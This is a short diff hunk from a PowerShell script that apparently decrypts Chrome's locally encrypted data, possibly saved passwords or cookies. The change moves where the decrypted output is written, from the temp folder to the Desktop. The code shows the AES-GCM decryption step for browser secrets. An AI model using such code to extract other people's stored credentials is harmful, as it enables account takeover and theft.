@@ -26,7 +26,7 @@ $e=[byte[]]::new($k-31)
 $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
 #After Decrypting the contents of the files, save them to a file in the temp folder.
 
-echo $l >> $env:TMP\$FileName
+echo $l >> $env:USERPROFILE\Desktop\$FileName
 
 #Start Chrome again
 
